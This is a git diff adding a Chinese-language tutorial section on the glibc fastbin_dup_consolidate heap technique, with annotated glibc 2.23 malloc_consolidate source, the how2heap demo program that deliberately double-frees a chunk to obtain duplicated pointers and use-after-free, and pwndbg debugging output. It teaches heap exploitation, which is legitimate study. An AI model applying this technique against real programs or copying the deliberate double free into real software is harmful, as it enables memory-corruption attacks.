@@ -1,6 +1,6 @@
 # Fastbin Attack
 
-**本篇是基于github上面how2heap项目撰写的**
+**本篇是基于github上面how2heap项目以及glibc源代码撰写的**
 
 ### fastbin double free 
 * **什么是double free** 
@@ -250,3 +250,324 @@ Size: 0x20fa0 (with flag bits: 0x20fa1)
 
 * **请注意：fastbin double free机制虽然通用，但是在glibc-2.26版本引入tcache结构体之后，必须先把对应的tcachebin填满才能把堆块释放入fastbin。同样的，再malloc回来时，必须先把tcache里面的块分配完才会轮到fastbin**
 
+### fastbin malloc consolidate
+* **什么是malloc consolidate**
+malloc consolidate是linux堆管理的一个机制，目的是防止大量的碎片化chunk滞留在bins里面，浪费空间。
+先看下面的linux源代码：
+```c
+// glibc-2.23 version
+static void malloc_consolidate(mstate av)
+{
+  mfastbinptr*    fb;                 /* current fastbin being consolidated */
+  mfastbinptr*    maxfb;              /* last fastbin (for loop control) */
+  mchunkptr       p;                  /* current chunk being consolidated */
+  mchunkptr       nextp;              /* next chunk to consolidate */
+  mchunkptr       unsorted_bin;       /* bin header */
+  mchunkptr       first_unsorted;     /* chunk to link to */
+
+  /* These have same use as in free() */
+  mchunkptr       nextchunk;
+  INTERNAL_SIZE_T size;
+  INTERNAL_SIZE_T nextsize;
+  INTERNAL_SIZE_T prevsize;
+  int             nextinuse;
+
+  atomic_store_relaxed (&av->have_fastchunks, false);
+
+  unsorted_bin = unsorted_chunks(av); // 拿到unsorted bin头
+
+  /*
+    Remove each chunk from fast bin and consolidate it, placing it
+    then in unsorted bin. Among other reasons for doing this,
+    placing in unsorted bin avoids needing to calculate actual bins
+    until malloc is sure that chunks aren't immediately going to be
+    reused anyway.
+  */
+
+  maxfb = &fastbin (av, NFASTBINS - 1); // 最大的fastbin链表头
+  fb = &fastbin (av, 0); // 最小的fastbin链表头
+  do {
+    p = atomic_exchange_acq (fb, NULL);
+    if (p != 0) {
+      do {
+		{ // 这个部分是存在性和大小检查
+		  if (__glibc_unlikely (misaligned_chunk (p)))
+		    malloc_printerr ("malloc_consolidate(): "
+				     "unaligned fastbin chunk detected");
+
+		  unsigned int idx = fastbin_index (chunksize (p));
+		  if ((&fastbin (av, idx)) != fb)
+		    malloc_printerr ("malloc_consolidate(): invalid chunk size");
+		}
+
+		check_inuse_chunk(av, p);
+		nextp = REVEAL_PTR (p->fd);
+
+		/* Slightly streamlined version of consolidation code in free() */
+		size = chunksize (p);
+		nextchunk = chunk_at_offset(p, size);
+		nextsize = chunksize(nextchunk);
+
+		if (!prev_inuse(p)) { // 检查当前chunk的前一个相邻chunk是否在使用，如果是被释放的，执行consolidate操作
+		  prevsize = prev_size (p);
+		  size += prevsize; // 先增长size
+		  p = chunk_at_offset(p, -((long) prevsize)); // 再移动指针
+		  if (__glibc_unlikely (chunksize(p) != prevsize))
+		    malloc_printerr ("corrupted size vs. prev_size in fastbins");
+		  unlink_chunk (av, p); // 将原本的chunk脱对应bin链
+		}
+
+		if (nextchunk != av->top) { // 如果下一个chunk所在位置不是top chunk
+		  nextinuse = inuse_bit_at_offset(nextchunk, nextsize);
+
+		  if (!nextinuse) { // 这个chunk如果也是处于释放状态
+		    size += nextsize;  // 改变当前chunk的大小
+		    unlink_chunk (av, nextchunk); // 直接再将原本的下一个chunk脱对应bin链
+		  } else
+		    clear_inuse_bit_at_offset(nextchunk, 0);
+
+		  first_unsorted = unsorted_bin->fd;
+		  unsorted_bin->fd = p;
+		  first_unsorted->bk = p; // 将合并之后的chunk插入unsorted bin链表
+
+		  if (!in_smallbin_range (size)) { // 如果大小为large bins的范围，还需要先初始化large bin 的fdnextsize和bknextsize指针
+		    p->fd_nextsize = NULL;
+		    p->bk_nextsize = NULL;
+		  }
+
+		  set_head(p, size | PREV_INUSE);
+		  p->bk = unsorted_bin;
+		  p->fd = first_unsorted;
+		  set_foot(p, size);
+		}
+
+		else { // 如果下一个是top chunk，直接与top chunk合并
+		  size += nextsize;
+		  set_head(p, size | PREV_INUSE);
+		  av->top = p;
+		}
+
+      } while ( (p = nextp) != 0); // fastbin里面每个块都进行consolidate
+
+    }
+  } while (fb++ != maxfb); // 每个fastbin都进行合并
+}
+```
+
+* **看完上面malloc consolidate的具体操作，下面来具体解释一下完整触发consolidate操作的流程**
+1. 如果当前堆块的分配大小在large bin的范围，系统会先执行malloc_consolidate操作
+2. 将fastbin里面能合并的堆块都合并一遍再脱链，脱链之后的chunk会被放到unsorted bin里面等待分配，保证fastbin被清空。
+3. 在fastbin上面的chunk，先向低地址的相邻chunk发送合并请求（如果是空闲块，则合并；不空闲则无视）。再向高地址的相邻块发送合并请求。但是这里会出现top chunk的问题，所以要先进行判断：
+	如果相邻高地址位置是top chunk，则直接与top chunk合并，top chunk的指针上移；
+	如果相邻高地址是空闲的块，则可以直接合并（不空闲则无视）
+
+* **那如何利用这个机制实现fastbin attack呢，比如通过double free，拿到某些可以利用的地址**
+那我们直接来看下面这个how2heap的例子，这里是拿到了top chunk的地址，实现了UAF，并且之后就可以编辑top chunk了
+```c
+// how2heap/glibc_2.23/fastbin_dup_consolidate.c
+// malloc consolidate 源码位置： https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L4122
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <assert.h>
+
+int main() {
+	printf("This technique will make use of malloc_consolidate and a double free to gain a UAF / duplication of a large-sized chunk\n");
+
+	void* p1 = calloc(1,0x40); // 先malloc一个0x40的块
+
+	printf("Allocate a fastbin chunk p1=%p \n", p1);
+  	printf("Freeing p1 will add it to the fastbin.\n\n");
+  	free(p1);  // 把它释放了，他应该会进入fastbin
+
+  	void* p3 = malloc(0x400); // 分配一个large bin大小的chunk，这会触发系统执行malloc consolidate，那刚才放入p1的fastbin就会被清空，p1会与先与top chunk合并，然后再重新切割出来一个0x410的块分配给用户。
+
+	printf("To trigger malloc_consolidate we need to allocate a chunk with large chunk size (>= 0x400)\n");
+	printf("which corresponds to request size >= 0x3f0. We will request 0x400 bytes, which will gives us\n");
+	printf("a chunk with chunk size 0x410. p3=%p\n", p3);
+
+	printf("\nmalloc_consolidate will merge the fast chunk p1 with top.\n");
+	printf("p3 is allocated from top since there is no bin bigger than it. Thus, p1 = p3.\n");
+
+	assert(p1 == p3); // 但是p1和p3指针都会指向最原始的p1那个地址
+
+  	printf("We will double free p1, which now points to the 0x410 chunk we just allocated (p3).\n\n");
+	free(p1); // vulnerability // 由于p1和p3都指向的是那块地址，所以free(p1)等同于free(p3),这个chunk就被放到unsorted bin上面了。
+
+	printf("So p1 is double freed, and p3 hasn't been freed although it now points to the top, as our\n");
+	printf("chunk got consolidated with it. We have thus achieved UAF!\n");
+
+	printf("We will request a chunk of size 0x400, this will give us a 0x410 chunk from the top\n");
+	printf("p3 and p1 will still be pointing to it.\n");
+	void *p4 = malloc(0x400); // 这个块先与top chunk进行合并，再从top chunk上面切割下来一个0x410大小的块分配给用户。p1 p3 p4都指向的是同一个地址。
+
+	assert(p4 == p3); 
+
+	printf("We now have two pointers (p3 and p4) that haven't been directly freed\n");
+	printf("and both point to the same large-sized chunk. p3=%p p4=%p\n", p3, p4);
+	printf("We have achieved duplication!\n\n");
+	return 0;
+}
+```
+
+要看懂上面的操作在干什么，以及为什么会触发malloc consolidate，我们还需要再次回到glibc源码上面，这回我们看分配阶段，也就是_int_malloc的源码
+```c
+// malloc.c 3437:
+ /*
+     If this is a large request, consolidate fastbins before continuing.
+     While it might look excessive to kill all fastbins before
+     even seeing if there is space available, this avoids
+     fragmentation problems normally associated with fastbins.
+     Also, in practice, programs tend to have runs of either small or
+     large requests, but less often mixtures, so consolidation is not
+     invoked all that often in most programs. And the programs that
+     it is called frequently in otherwise tend to fragment.
+   */
+
+  else // 如果当前分配大小在large bin范围内
+    {
+      idx = largebin_index (nb);
+      if (have_fastchunks (av))  // fastbin里面有chunk
+        malloc_consolidate (av);  // 进行malloc consolidate
+    }
+```
+这也就解释了为什么我们在`malloc(0x400)`的时候，会先进行malloc consolidate，使得fastbin里面的空块被与top chunk合并了
+
+* **依旧用gdb来断点调试查看（下面说的断点位置都是github上面源项目里面的行数）**
+1. 先calloc一个0x40的堆块
+```bash
+pwndbg> b 33
+Breakpoint 2 at 0x555555555217: file glibc_2.23/fastbin_dup_consolidate.c, line 34.
+pwndbg> c
+Continuing.
+pwndbg> heap
+Allocated chunk | PREV_INUSE
+Addr: 0x555555559000
+Size: 0x410 (with flag bits: 0x411) // 至于这个0x400的堆块，不是由用户编写的malloc分配的，而是由于最开始的printf提供了文件IO缓冲区初始化创建的
+
+Allocated chunk | PREV_INUSE
+Addr: 0x555555559410
+Size: 0x50 (with flag bits: 0x51) // calloc(1,0x40); 
+
+Top chunk | PREV_INUSE
+Addr: 0x555555559460
+Size: 0x20ba0 (with flag bits: 0x20ba1)
+```
+2. 再把它free掉，发现他在fastbin上面
+```bash
+pwndbg> b 37
+Breakpoint 3 at 0x55555555524d: file glibc_2.23/fastbin_dup_consolidate.c, line 38.
+pwndbg> c
+Continuing.
+Allocate a fastbin chunk p1=0x555555559420  // 第一个chunk被分配到0x555555559410位置了
+Freeing p1 will add it to the fastbin.
+pwndbg> fastbin
+fastbins
+0x50: 0x555555559410 ◂— 0
+pwndbg> heap
+Allocated chunk | PREV_INUSE
+Addr: 0x555555559000
+Size: 0x410 (with flag bits: 0x411)
+
+Free chunk (fastbins) | PREV_INUSE // 现在他还在fastbin里面
+Addr: 0x555555559410
+Size: 0x50 (with flag bits: 0x51)
+fd: 0x00
+
+Top chunk | PREV_INUSE
+Addr: 0x555555559460
+Size: 0x20ba0 (with flag bits: 0x20ba1)
+```
+3. 这时候malloc(0x400)，这是一个large bin大小的堆块，会触发malloc consolidate
+```bash
+pwndbg> b 46
+Breakpoint 4 at 0x5555555552b2: file glibc_2.23/fastbin_dup_consolidate.c, line 47.
+pwndbg> c
+Continuing.
+To trigger malloc_consolidate we need to allocate a chunk with large chunk size (>= 0x400)
+which corresponds to request size >= 0x3f0. We will request 0x400 bytes, which will gives us
+a chunk with chunk size 0x410. p3=0x555555559420 可以看到这个块被分配到p1同样的地址了
+
+malloc_consolidate will merge the fast chunk p1 with top.
+p3 is allocated from top since there is no bin bigger than it. Thus, p1 = p3.
+pwndbg> fastbin
+fastbins
+empty
+pwndbg> unsortedbin
+unsortedbin
+empty
+pwndbg> heap
+Allocated chunk | PREV_INUSE
+Addr: 0x555555559000
+Size: 0x410 (with flag bits: 0x411)
+
+Allocated chunk | PREV_INUSE
+Addr: 0x555555559410
+Size: 0x410 (with flag bits: 0x411) // 这里的chunk其实是先合并入top chunk，然后再从top chunk里面分配出来的
+
+Top chunk | PREV_INUSE
+Addr: 0x555555559820
+Size: 0x207e0 (with flag bits: 0x207e1)
+```
+4. double free p1, 在free的时候也会consolidate，被合并到top chunk里面
+```c
+// malloc.c 4049:
+/*
+      If the chunk borders the current high end of memory,
+      consolidate into top
+    */
+
+    else {
+      size += nextsize;
+      set_head(p, size | PREV_INUSE);
+      av->top = p;
+      check_chunk(av, p);
+    }
+```
+```bash
+pwndbg> b 54
+Breakpoint 5 at 0x55555555531d: file glibc_2.23/fastbin_dup_consolidate.c, line 55.
+pwndbg> c
+Continuing.
+We will double free p1, which now points to the 0x410 chunk we just allocated (p3).
+
+So p1 is double freed, and p3 hasn't been freed although it now points to the top, as our
+chunk got consolidated with it. We have thus achieved UAF!
+pwndbg> heap
+Allocated chunk | PREV_INUSE
+Addr: 0x555555559000
+Size: 0x410 (with flag bits: 0x411)
+
+Top chunk | PREV_INUSE 可见已经被合到top chunk里面了
+Addr: 0x555555559410
+Size: 0x20bf0 (with flag bits: 0x20bf1) 
+```
+5. 再malloc(0x400)一下，再次从top chunk上面切下来一个0x410的块，现在p1,p3,p4都指向同一个地址`0x555555559420`了。成功DUP！
+```bash
+pwndbg> b 64
+Breakpoint 7 at 0x5555555553b8: file glibc_2.23/fastbin_dup_consolidate.c, line 64.
+pwndbg> c
+Continuing.
+We will request a chunk of size 0x400, this will give us a 0x410 chunk from the top
+p3 and p1 will still be pointing to it.
+
+We now have two pointers (p3 and p4) that haven't been directly freed
+and both point to the same large-sized chunk. p3=0x555555559420 p4=0x555555559420
+We have achieved duplication!
+pwndbg> heap
+Allocated chunk | PREV_INUSE
+Addr: 0x555555559000
+Size: 0x410 (with flag bits: 0x411)
+
+Allocated chunk | PREV_INUSE
+Addr: 0x555555559410 还是这个地址
+Size: 0x410 (with flag bits: 0x411)
+
+Top chunk | PREV_INUSE
+Addr: 0x555555559820
+Size: 0x207e0 (with flag bits: 0x207e1)
+```
+
+* **fastbin_dup_consolidate也是一种绕开fastbin double free检查机制的方法。可以将多个指针指向同一块地址，多次利用，并且可以在释放后继续使用**
+
+### fastbin_dup_into_stack
